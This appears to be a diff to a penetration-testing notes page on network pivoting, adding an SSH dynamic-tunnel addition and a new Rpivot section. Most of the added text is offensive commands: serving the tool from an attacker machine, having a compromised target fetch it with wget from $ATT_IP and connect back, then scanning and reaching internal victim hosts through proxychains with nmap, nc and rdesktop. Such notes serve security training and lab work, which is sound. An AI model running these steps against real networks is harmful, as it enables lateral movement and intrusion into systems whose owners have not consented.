@@ -78,6 +78,8 @@ Once we have access to a machine with SSH credential we can create a tunnel to c
 Establish the tunnel on a local port
 
 ```bash
+sudo apt install proxychains
+
 ssh -D $LOCAL_PORT $USER@$VICTIM1_IP
 # ex ssh -D 8090 mario@192.168.3.2
 ```
@@ -97,11 +99,82 @@ Now using `proxychains` we can access to all port of all other network machines.
 # this command to create a port fordward which allow us to see a web page
 proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2
 
+# use nmap through the pivoting
+proxychains nmap -sT $VICTIM2_IP
+
 # this command allow us to access via RDP to other machine in other network
 proxychains rdesktop $VICTIM2_IP
 ```
 
+***
 
+## Pivoting with Rpivot
+
+_RPIVOT allows to tunnel traffic into internal network via socks 4. It works like ssh dynamic port forwarding but in the opposite direction. Target machine as client and attack machine as server._
+
+This tool is usefull when we have access to a machine through web rev shell but **we do not have the credentials** to make a SSH tunneling.
+
+{% embed url="https://github.com/klsecservices/rpivot" %}
+
+```bash
+git clone https://github.com/klsecservices/rpivot
+```
+
+This tool works with Python2, to running it we can create a virtual env with conda
+
+{% code overflow="wrap" %}
+```bash
+cd rpivot
+conda create -n rpivot python=2.7
+
+# Start the server on attacker machine
+python2 server.py --server-port $SERVER_PORT --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port $PROXY_PORT # (ex SERVER_PORT = 9980 and PROXY_PORT 9050)
+# server_port = expose port from receiving client connection
+# proxy_port = port which will be use by proxychains
+```
+{% endcode %}
+
+Now we have to transfer the rpivot .zip directory to target machine
+
+```bash
+# attack machine in the dir where there is rpivot.zip
+python3 -m http.server 80
+
+# target machine
+wget http://$ATT_IP/rpivot.zip
+```
+
+Check if in the target machine there is python2 installed and run the connection to the server.
+
+```bash
+# target machine
+python --version # check python version
+
+# conect to the rpivot server
+python client.py --server-ip $ATT_IP --server-port $SERVER_PORT
+```
+
+When the connection has been initialized, we have to add this configuration to proxychain conf file.
+
+```bash
+nano /etc/proxychains.conf
+
+# add follow line in the bottom
+socks4 127.0.0.1 $PROXY_PORT
+```
+
+Now using `proxychains` we can access to all port of all other network machines.
+
+```bash
+# this command to create a port fordward which allow us to see a web page
+proxychains nc -nv $VICTIM2_IP $PORT_TO_FORWARD_ON_VICTIM2
+
+# use nmap through the pivoting
+proxychains nmap -sT $VICTIM2_IP
+
+# this command allow us to access via RDP to other machine in other network
+proxychains rdesktop $VICTIM2_IP
+```
 
 ***
 
